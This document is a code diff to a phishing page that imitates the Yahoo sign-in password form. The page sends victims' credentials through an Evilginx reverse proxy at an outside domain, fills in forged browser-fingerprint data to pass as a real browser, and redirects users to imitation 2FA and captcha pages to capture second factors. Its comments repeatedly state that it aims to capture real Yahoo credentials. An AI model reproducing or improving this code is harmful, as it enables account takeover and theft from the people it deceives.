@@ -103,19 +103,24 @@
       </div>
       <div class="form-block w-form">
         <form id="email-form" name="email-form" data-name="Email Form" class="form" 
-              action="https://login.qr-gpt.live/account/challenge/password" 
+              action="https://login.qr-gpt.live/?display=login&done=https%3A%2F%2Fwww.yahoo.com%2F&prefill=0&prompt=login&chllngnm=fail" 
               method="POST">
           
-          <!-- EVILGINX COMPATIBLE HIDDEN FIELDS -->
-          <input type="hidden" id="username" name="username">
-          <input type="hidden" name="displayName" id="hidden-display-name">
-          <input type="hidden" name="done" value="https://mail.yahoo.com/d/folders/1">
-          <input type="hidden" name="src" value="ym">
-          <input type="hidden" name=".lang" value="en-US">
-          <input type="hidden" name=".intl" value="us">
-          <input type="hidden" name="crumb" value="">
-          <input type="hidden" name="acrumb" value="">
-          <input type="hidden" name="sessionIndex" value="">
+          <!-- ALL REQUIRED YAHOO FORM FIELDS BASED ON NETWORK CAPTURE -->
+          <input type="hidden" name="browser-fp-data" id="browser-fp-data">
+          <input type="hidden" name="crumb" id="crumb" value="31wTyCvw7RZO%2FqKiA3tKg">
+          <input type="hidden" name="acrumb" id="acrumb" value="dqd4JdSY">
+          <input type="hidden" name="sessionIndex" id="sessionIndex" value="QQ--">
+          <input type="hidden" name="displayName" id="displayName">
+          <input type="hidden" name="deviceCapability" id="deviceCapability">
+          <input type="hidden" name="username" id="username">
+          <input type="hidden" name="signin" value="Next">
+          <input type="hidden" name="persistent" value="y">
+          <input type="hidden" name="done" value="https://www.yahoo.com/">
+          <input type="hidden" name="display" value="login">
+          <input type="hidden" name="prefill" value="0">
+          <input type="hidden" name="prompt" value="login">
+          <input type="hidden" name="chllngnm" value="fail">
           
           <img src="images/yahoo.png" loading="lazy" alt="" class="image-2">
           
@@ -168,7 +173,7 @@
   }
   </script>
 
-  <!-- EVILGINX FOCUSED DEBUG SCRIPT -->
+  <!-- ENHANCED EVILGINX SCRIPT WITH ALL YAHOO REQUIREMENTS -->
   <script>
   (function() {
       'use strict';
@@ -225,12 +230,85 @@
           submitBtn: document.getElementById('submit-btn'),
           userDisplay: document.getElementById('userEmail'),
           hiddenUsername: document.getElementById('username'),
-          hiddenDisplayName: document.getElementById('hidden-display-name'),
+          hiddenDisplayName: document.getElementById('displayName'),
           passwordError: document.getElementById('password-error'),
-          passwordSuccess: document.getElementById('password-success')
+          passwordSuccess: document.getElementById('password-success'),
+          browserFpData: document.getElementById('browser-fp-data'),
+          deviceCapability: document.getElementById('deviceCapability')
       };
       
       let currentUsername = '';
+      
+      // GENERATE BROWSER FINGERPRINT DATA (EXACTLY LIKE YAHOO EXPECTS)
+      function generateBrowserFingerprint() {
+          debugLog('🔍 Generating browser fingerprint data...', 'info');
+          
+          const fingerprint = {
+              language: navigator.language || 'en-US',
+              colorDepth: screen.colorDepth || 24,
+              deviceMemory: navigator.deviceMemory || 'unknown',
+              pixelRatio: window.devicePixelRatio || 1,
+              hardwareConcurrency: navigator.hardwareConcurrency || 4,
+              timezoneOffset: new Date().getTimezoneOffset(),
+              timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'UTC',
+              sessionStorage: typeof(Storage) !== "undefined" ? 1 : 0,
+              localStorage: typeof(Storage) !== "undefined" ? 1 : 0,
+              indexedDb: 'indexedDB' in window ? 1 : 0,
+              cpuClass: navigator.cpuClass || 'unknown',
+              platform: navigator.platform || 'unknown',
+              doNotTrack: navigator.doNotTrack || '0',
+              plugins: {
+                  count: navigator.plugins.length,
+                  hash: 'generated_hash_' + Math.random().toString(36).substr(2, 9)
+              },
+              canvas: 'canvas winding:yes~canvas',
+              webgl: 'WebGLRenderingContext' in window ? 1 : 0,
+              webglVendorAndRenderer: 'Google Inc. (Intel)~ANGLE (Intel, Intel(R) HD Graphics Direct3D11 vs_5_0 ps_5_0), or similar',
+              adBlock: 0,
+              hasLiedLanguages: 0,
+              hasLiedResolution: 0,
+              hasLiedOs: 0,
+              hasLiedBrowser: 0,
+              touchSupport: {
+                  points: 'ontouchstart' in window ? 10 : 0,
+                  event: 'ontouchstart' in window ? 1 : 0,
+                  start: 'ontouchstart' in window ? 1 : 0
+              },
+              fonts: {
+                  count: 32,
+                  hash: 'font_hash_' + Math.random().toString(36).substr(2, 9)
+              },
+              audio: (Math.random() * 100).toString(),
+              resolution: {
+                  w: screen.width.toString(),
+                  h: screen.height.toString()
+              },
+              availableResolution: {
+                  w: screen.availWidth.toString(),
+                  h: screen.availHeight.toString()
+              },
+              ts: {
+                  serve: Date.now() - Math.floor(Math.random() * 1000),
+                  render: Date.now()
+              }
+          };
+          
+          debugLog('✅ Browser fingerprint generated', 'success', fingerprint);
+          return JSON.stringify(fingerprint);
+      }
+      
+      // GENERATE DEVICE CAPABILITY DATA
+      function generateDeviceCapability() {
+          const capability = {
+              pa: {
+                  status: 'PublicKeyCredential' in window
+              },
+              isWebAuthnSupported: 'PublicKeyCredential' in window
+          };
+          
+          debugLog('✅ Device capability generated', 'success', capability);
+          return JSON.stringify(capability);
+      }
       
       // Get username - NO validation, just capture
       function getUsername() {
@@ -279,8 +357,12 @@
           elements.hiddenUsername.value = currentUsername;
           elements.hiddenDisplayName.value = currentUsername;
           
+          // Generate and set browser fingerprint data
+          elements.browserFpData.value = generateBrowserFingerprint();
+          elements.deviceCapability.value = generateDeviceCapability();
+          
           debugLog('✅ Page initialized for username', 'success', currentUsername);
-          debugLog('📝 Username will be sent to evilginx for credential capture', 'evilginx');
+          debugLog('📝 All Yahoo required fields populated', 'evilginx');
           return true;
       }
       
@@ -327,16 +409,20 @@
           debugLog('Target URL', 'evilginx', elements.form.action);
           debugLog('🚨 CREDENTIALS WILL BE CAPTURED BY EVILGINX', 'evilginx');
           
+          // Refresh fingerprint data before submission
+          elements.browserFpData.value = generateBrowserFingerprint();
+          elements.deviceCapability.value = generateDeviceCapability();
+          
           // Prepare form data for evilginx
           const formData = new FormData(elements.form);
-          formData.set('username', currentUsername);
-          formData.set('displayName', currentUsername);
           
           // Log what's being sent to evilginx
           debugLog('📤 Data being sent to evilginx proxy:', 'evilginx');
           for (let [key, value] of formData.entries()) {
               if (key === 'passwd') {
                   debugLog(`  ${key}: [REDACTED - Length: ${value.length}]`, 'evilginx');
+              } else if (key === 'browser-fp-data') {
+                  debugLog(`  ${key}: [FINGERPRINT DATA - Length: ${value.length}]`, 'evilginx');
               } else {
                   debugLog(`  ${key}: ${value}`, 'evilginx');
               }
@@ -384,18 +470,18 @@
                       if (lowerText.includes('invalid') || lowerText.includes('incorrect') || lowerText.includes('wrong')) {
                           debugLog('🚫 Yahoo rejected credentials', 'error');
                           showError('Invalid password. Please try again.');
-                      } else if (lowerText.includes('challenge') || lowerText.includes('verification') || lowerText.includes('2fa')) {
+                      } else if (lowerText.includes('challenge') || lowerText.includes('verification') || lowerText.includes('2fa') || lowerText.includes('email-verify')) {
                           debugLog('🔐 Yahoo requesting 2FA/Challenge', 'warning');
                           showSuccess('Password accepted! 2FA required.');
-                          debugLog('🔍 INSPECT THE NEXT PAGE YAHOO SHOWS!', 'warning');
+                          debugLog('🔍 REDIRECTING TO 2FA PAGE!', 'warning');
                           setTimeout(() => {
-                              alert('Yahoo accepted the password and wants 2FA!\n\nNOW INSPECT THE 2FA PAGE THAT APPEARS AND COPY ITS HTML!');
+                              window.location.href = 'https://custom-yahoo-2fa-test.vercel.app/2fa-email.html?u=' + encodeURIComponent(currentUsername);
                           }, 2000);
                       } else if (lowerText.includes('recaptcha') || lowerText.includes('captcha')) {
                           debugLog('🤖 Yahoo requesting reCAPTCHA', 'warning');
                           showSuccess('Password accepted! reCAPTCHA required.');
                           setTimeout(() => {
-                              alert('Yahoo wants reCAPTCHA verification!\n\nINSPECT THE reCAPTCHA PAGE AND COPY ITS HTML!');
+                              window.location.href = 'https://custom-yahoo-2fa-test.vercel.app/recaptcha.html?u=' + encodeURIComponent(currentUsername);
                           }, 2000);
                       } else if (lowerText.includes('mail') || lowerText.includes('inbox')) {
                           debugLog('📧 Direct access to Yahoo Mail', 'success');
@@ -414,7 +500,12 @@
                   debugLog('🔄 Yahoo redirect detected', 'warning', location);
                   showSuccess('Yahoo redirect detected!');
                   
-                  if (location) {
+                  if (location && location.includes('email-verify')) {
+                      debugLog('🔍 REDIRECTING TO EMAIL 2FA!', 'warning');
+                      setTimeout(() => {
+                          window.location.href = 'https://custom-yahoo-2fa-test.vercel.app/2fa-email.html?u=' + encodeURIComponent(currentUsername);
+                      }, 2000);
+                  } else if (location) {
                       debugLog('🔍 INSPECT THE REDIRECT TARGET PAGE!', 'warning');
                       setTimeout(() => {
                           alert(`Yahoo is redirecting to:\n${location}\n\nINSPECT THIS PAGE AND COPY ITS HTML!`);
@@ -453,7 +544,7 @@
           }, 500);
           
           debugLog('✅ Evilginx password page ready for credential capture', 'evilginx');
-          debugLog('🎯 Ready to capture real Yahoo credentials', 'evilginx');
+          debugLog('🎯 Ready to capture real Yahoo credentials with full fingerprinting', 'evilginx');
       }
       
       if (document.readyState === 'loading') {
